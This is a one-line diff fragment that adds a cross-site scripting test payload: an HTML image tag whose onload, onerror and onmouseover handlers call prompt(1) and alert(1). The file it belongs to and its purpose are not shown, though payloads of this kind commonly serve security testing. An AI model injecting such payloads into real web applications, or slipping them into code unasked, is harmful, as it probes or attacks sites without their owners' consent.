@@ -1,0 +1,1 @@
+<img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>
